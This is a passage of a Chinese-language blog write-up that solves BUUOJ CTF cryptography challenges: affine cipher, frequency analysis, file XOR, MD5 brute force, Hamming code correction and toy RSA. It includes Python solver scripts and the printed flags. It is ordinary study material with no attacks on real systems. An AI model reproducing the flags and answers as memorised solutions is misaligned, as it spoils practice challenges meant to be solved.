dependent on his Will alone for the tenure of their offices, and the amount and payment of their salaries.flag is afctf&#123;Whooooooo_U_Gotcha!&#125;He has erected a multitude of New Offices, and sent hither swarms of Officers to harass our people and eat out their substance.He has kept among us, in times of peace, Standing Armies without the Consent of our legislatures.He has affected to render the Military independent of and superior to the Civil Power.He has combined with others to subject us to a jurisdiction foreign to our constitution, and unacknowledged by our laws; giving his Assent to their Acts of pretended Legislation:For quartering large bodies of armed troops among us:For protecting them, by a mock Trial from punishment for any Murders which they should commit on the Inhabitants of these States:For cutting off our Trade with all parts of the world:For imposing Taxes on us without our Consent:For depriving us in many cases, of the benefit of Trial by Jury:For transporting us beyond Seas to be tried for pretended offences:For abolishing the free System of English Laws in a neighbouring Province, establishing therein an Arbitrary government, and enlarging its Boundaries so as to render it at once an example and fit instrument for introducing the same absolute rule into these ColoniesFor taking away our Charters, abolishing our most valuable Laws and altering fundamentally the Forms of our Governments:For suspending our own Legislatures, and declaring themselves invested with power to legislate for us in all cases whatsoever.He has abdicated Government here, by declaring us out of his Protection and waging War against us.He has plundered our seas, ravaged our coasts, burnt our towns, and destroyed the lives of our people.He is at this time transporting large Armies of foreign Mercenaries to compleat the works of death, desolation, and tyranny, already begun with circumstances of Cruelty &amp; Perfidy scarcely paralleled in the most barbarous ages, and totally unworthy the Head of a civilized nation.He has constrained our fellow Citizens taken Captive on the high Seas to bear Arms against their Country, to become the executioners of their friends and Brethren, or to fall themselves by their Hands.He has excited domestic insurrections amongst us, and has endeavoured to bring on the inhabitants of our frontiers, the merciless Indian Savages whose known rule of warfare, is an undistinguished destruction of all ages, sexes and conditions.In every stage of these Oppressions We have Petitioned for Redress in the most humble terms: Our repeated Petitions have been answered only by repeated injury. A Prince, whose character is thus marked by every act which may define a Tyrant, is unfit to be the ruler of a free people.Nor have We been wanting in attentions to our British brethren. We have warned them from time to time of attempts by their legislature to extend an unwarrantable jurisdiction over us. We have reminded them of the circumstances of our emigration and settlement here. We have appealed to their native justice and magnanimity, and we have conjured them by the ties of our common kindred to disavow these usurpations, which would inevitably interrupt our connections and correspondence. They too have been deaf to the voice of justice and of consanguinity. We must, therefore, acquiesce in the necessity, which denounces our Separation, and hold them, as we hold the rest of mankind, Enemies in War, in Peace Friends.We, therefore, the Representatives of the united States of America, in General Congress, Assembled, appealing to the Supreme Judge of the world for the rectitude of our intentions, do, in the Name, and by Authority of the good People of these Colonies, solemnly publish and declare, That these united Colonies are, and of Right ought to be Free and Independent States, that they are Absolved from all Allegiance to the British Crown, and that all political connection between them and the State of Great Britain, is and ought to be totally dissolved; and that as Free and Independent States, they have full Power to levy War, conclude Peace, contract Alliances, establish Commerce, and to do all other Acts and Things which Independent States may of right do. — And for the support of this Declaration, with a firm reliance on the protection of Divine Providence, we mutually pledge to each other our Lives, our Fortunes, and our sacred Honor.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="模运算"><a href="#模运算" class="headerlink" title="模运算"></a>模运算</h1><h2 id="1-模运算-小学生的密码学"><a href="#1-模运算-小学生的密码学" class="headerlink" title="1.模运算-小学生的密码学"></a>1.模运算-小学生的密码学</h2><p>仿射密码解密脚本<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#@author:M4xlmum</span><span class="token triple-quoted-string string">'''表达式:e(x)=11x+6(mod26)密文：welcylk'''</span><span class="token keyword">import</span> gmpy2<span class="token comment">#再用到时改下参数即可</span>a <span class="token operator">=</span> <span class="token number">11</span>b <span class="token operator">=</span> <span class="token number">6</span>mul <span class="token operator">=</span> <span class="token number">0</span><span class="token comment">#求乘法逆元</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">*</span> a<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        mul <span class="token operator">=</span> i        <span class="token keyword">break</span><span class="token comment">#求加法逆元</span>add <span class="token operator">=</span> <span class="token number">26</span> <span class="token operator">-</span> b<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"乘法逆元为:"</span><span class="token punctuation">,</span> mul<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加法逆元为:"</span><span class="token punctuation">,</span> add<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''解密算法即为:d(x) = (x + add) * muld(x) = (x+20) * 19'''</span>m <span class="token operator">=</span> <span class="token string">"welcylk"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">97</span><span class="token operator">+</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">+</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n仿射解密完成"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><code>sorcery</code><br><code>flag&#123;c29yY2VyeQ==&#125;</code></p><h1 id="字频分析"><a href="#字频分析" class="headerlink" title="字频分析"></a>字频分析</h1><h2 id="1-词频分析-BJDCTF-2nd-Y1nglish-y1ng"><a href="#1-词频分析-BJDCTF-2nd-Y1nglish-y1ng" class="headerlink" title="1.词频分析-[BJDCTF 2nd]Y1nglish-y1ng"></a>1.词频分析-[BJDCTF 2nd]Y1nglish-y1ng</h2><blockquote><p>给了个文本，这种就是字母硬替换（随即替换，没有一点规律），一般情况下，除非给出密码表，否则很难解密。但是好在还是有方法，因为英文字母的出现次数的多或少，可以按照字频解密，这里用一个在线网站解密<br><a href="https://quipqiup.com/">quipquip</a><br><img src="/2020/11/25/BUUOJ-crypto/1.png" alt><br><code>BJD &#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy&#125;</code>、<code>flag&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy&#125;</code>，<em>_</em>，<code>flag&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck&#125;</code></p></blockquote><h2 id="2-词频分析-世上无难事"><a href="#2-词频分析-世上无难事" class="headerlink" title="2.词频分析-世上无难事"></a>2.词频分析-世上无难事</h2><p>词频分析</p><pre class="line-numbers language-none"><code class="language-none">HELLO EVERYBODY THANK YOU ALL RIGHT EVERYBODY GO AHEAD AND HAVE A SEAT HOW IS EVERYBODY DOING TODAY HOW ABOUT TIM SPICER WE ARE HERE WITH STUDENTS AT WAKEFIELD HIGH SCHOOL IN ARLINGTON VIRGINIA AND WE HAVE GOT STUDENTS TUNING IN FROM ALL ACROSS AMERICA FROM KINDERGARTEN THROUGH 12TH GRADE AND WE ARE JUST SO GLAD THAT ALL COULD JOIN US TODAY AND WE WANT TO THANK WAKEFIELD FOR BEING SUCH AN OUTSTANDING HOST GIVE YOURSELVES A BIG ROUND OF APPLAUSE AND THE KEY IS 640E11012805F211B0AB24FF02A1ED09<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>640E11012805F211B0AB24FF02A1ED09</code>题目说要小写，转换<code>flag&#123;640e11012805f211b0ab24ff02a1ed09&#125;</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> stringdata <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入大写:"</span><span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token keyword">in</span> string<span class="token punctuation">.</span>ascii_uppercase<span class="token punctuation">:</span>        res <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">+=</span> i<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="其他密码"><a href="#其他密码" class="headerlink" title="其他密码"></a>其他密码</h1><h2 id="1-文件异或-异性相吸"><a href="#1-文件异或-异性相吸" class="headerlink" title="1.文件异或-异性相吸"></a>1.文件异或-异性相吸</h2><p>文件异或，看属性都是38个字节，就把文件内容按位异或取结果，脚本<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">''</span>mfile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r"C:\Users\Administrator\Desktop\ctf题目\buuoh\crypto\异性相吸\mfile.txt"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r"C:\Users\Administrator\Desktop\ctf题目\buuoh\crypto\异性相吸\key.txt"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mfile<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><code>flag&#123;ea1bc0988992276b7f95b54a7435e89e&#125;</code></p><h2 id="2-文件异或-yxx"><a href="#2-文件异或-yxx" class="headerlink" title="2.文件异或-yxx"></a>2.文件异或-yxx</h2><p>跟上面的思路是一样的，直接文件内容异或，特点是<code>两个文件的字节数相同</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'明文.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f1<span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'密文.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f2<span class="token punctuation">:</span>    c1<span class="token punctuation">,</span> c2 <span class="token operator">=</span> f1<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> f2<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> c2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""32 32flag:nctf&#123;xor_xor_xor_biubiubiu&#125;flag&#123;xor_xor_xor_biubiubiu&#125;"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-md5爆破-还原大师"><a href="#3-md5爆破-还原大师" class="headerlink" title="3.md5爆破-还原大师"></a>3.md5爆破-还原大师</h2><pre class="line-numbers language-none"><code class="language-none">我们得到了一串神秘字符串：TASC?O3RJMV?WDJKX?ZM,问号部分是未知大写字母，为了确定这个神秘字符串，我们通过了其他途径获得了这个字串的32位MD5码。但是我们获得它的32位MD5码也是残缺不全，E903???4DAB????08?????51?80??8A?,请猜出神秘字符串的原本模样，并且提交这个字串的32位MD5码作为答案。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> stringdata <span class="token operator">=</span> <span class="token string">"TASC&#123;&#125;O3RJMV&#123;&#125;WDJKX&#123;&#125;ZM"</span>brute_upper <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_uppercase<span class="token keyword">for</span> i <span class="token keyword">in</span> brute_upper<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> brute_upper<span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> brute_upper<span class="token punctuation">:</span>            tmp <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"E903"</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"res="</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token comment">#TASCJO3RJMVKWDJKXLZM</span><span class="token comment">#res=E9032994DABAC08080091151380478A2</span><span class="token triple-quoted-string string">'''print(hashlib.md5(data.encode("UTF-8")).hexdigest().upper())'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>flag&#123;E9032994DABAC08080091151380478A2&#125;</code></p><h2 id="海明码、奇偶校验码-鸡藕椒盐味"><a href="#海明码、奇偶校验码-鸡藕椒盐味" class="headerlink" title="海明码、奇偶校验码-鸡藕椒盐味"></a>海明码、奇偶校验码-鸡藕椒盐味</h2><p>找个python写的海明码实现的例子如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> math userin <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入海明码:"</span><span class="token punctuation">)</span>haiming<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">#输入的海明码是字符串，下面的代码是将字符串转化成整型列表</span>haiming<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span>haiming<span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> userin<span class="token punctuation">:</span>haiming<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#计算校验码的个数</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>haiming<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token number">2</span><span class="token operator">**</span>i<span class="token operator">></span><span class="token builtin">len</span><span class="token punctuation">(</span>haiming<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">break</span><span class="token comment">#校验码个数</span>num <span class="token operator">=</span> i<span class="token comment">#标记错位</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>b<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#利用python的步长。</span>a <span class="token operator">=</span> haiming<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>haiming<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token number">2</span><span class="token operator">**</span>i<span class="token keyword">print</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span>i<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>haiming<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">></span><span class="token builtin">len</span><span class="token punctuation">(</span>haiming<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">break</span>b<span class="token punctuation">.</span>append<span class="token punctuation">(</span>haiming<span class="token punctuation">[</span>k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>flag <span class="token operator">=</span> flag<span class="token operator">+</span><span class="token number">2</span><span class="token operator">**</span>i<span class="token keyword">print</span> <span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">del</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> haiming<span class="token punctuation">[</span>flag<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                haiming<span class="token punctuation">[</span>flag<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>        <span class="token keyword">elif</span> haiming<span class="token punctuation">[</span>flag<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>                haiming<span class="token punctuation">[</span>flag<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"第%d位出错"</span> <span class="token operator">%</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span>haiming<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"没有错误"</span><span class="token punctuation">)</span>        <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Press &lt;enter>"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提示倒了一下序，原来的数据应该是</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">000001010011<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/25/BUUOJ-crypto/image-20210504234104663.png" alt="看到第9位出现错误，给他纠正回来"></p><pre class="line-numbers language-data" data-language="data"><code class="language-data">000001011011<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/25/BUUOJ-crypto/image-20210504234218752.png" alt="没错了"></p><p>再将数据倒数后进行md5哈希一下</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">110110100000查询结果：md5(110110100000,32) &#x3D; d14084c7ceca6359eaac6df3c234dd3bmd5(110110100000,16) &#x3D; ceca6359eaac6df3flag&#123;d14084c7ceca6359eaac6df3c234dd3b&#125;# RSA## 1.RSA基础-[HDCTF2019]basic rsa知识点:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pow(a, b, c) = a ^ b % c<br><pre class="line-numbers language-none"><code class="language-none">​&#96;&#96;&#96;python&quot;&quot;&quot;import gmpy2from Cryptodome.Util.number import *from binascii import a2b_hex, b2a_hexflag &#x3D; &quot;*********************&quot;p &#x3D; 262248800182277040650192055439906580479q &#x3D; 262854994239322828547925595487519915551e &#x3D; 65533n &#x3D; p * qc &#x3D; pow(int(b2a_hex(flag), 16), e, n)print(c)# 27565231154623519221597938803435789010285480123476977081867877272451638645710&quot;&quot;&quot;import gmpy2import libnumfrom Cryptodome.Util.number import *from binascii import a2b_hex, b2a_hexflag &#x3D; &quot;flag&#123;fake_flag&#125;&quot;p &#x3D; 262248800182277040650192055439906580479q &#x3D; 262854994239322828547925595487519915551e &#x3D; 65533n &#x3D; p * qc &#x3D; pow(int(b2a_hex(flag.encode()), 16), e, n)  # c &#x3D; m ^ e mod nprint(c)# 27565231154623519221597938803435789010285480123476977081867877272451638645710# 解密算法为m &#x3D; c ^ d mod nc &#x3D; 27565231154623519221597938803435789010285480123476977081867877272451638645710phi &#x3D; (p-1) * (q-1)d &#x3D; gmpy2.invert(e, phi)  # e * d &#x3D; 1 (mod phi) 求模逆d &#x3D; int(d)m &#x3D; pow(c, d, n)flag &#x3D; libnum.n2s(m)print(flag)# b&#39;flag&#123;B4by_Rs4&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>flag为<code>flag&#123;B4by_Rs4&#125;</code></p><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><h2 id="2-RSA基础-GUET-CTF2019-BabyRSA"><a href="#2-RSA基础-GUET-CTF2019-BabyRSA" class="headerlink" title="2.RSA基础-[GUET-CTF2019]BabyRSA"></a>2.RSA基础-[GUET-CTF2019]BabyRSA</h2><p>很简单的rsa，给出了太多，感觉不给p+q也能出啊。p+q或者e给哪个都能出的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token triple-quoted-string string">"""p+q : 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea(p+1)(q+1) : 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740e : 0xe6b1bee47bd63f615c7d0a43c529d219d : 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5enc_flag : 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9an = p * q(p+1)*(q+1) = p*q + p + q + 1n = p*q = (p+1)*(q+1) - (p + q) - 1# 开始想歪了，其实下面的没用d * e = 1 mod phi(p-1)*(q-1) = p*q - p - q + 1 = phi"""</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token comment"># 假设pq = p+q、p1q1 = (p-1)*(q-1)</span>pq <span class="token operator">=</span> <span class="token number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span>p1q1 <span class="token operator">=</span> <span class="token number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span>e 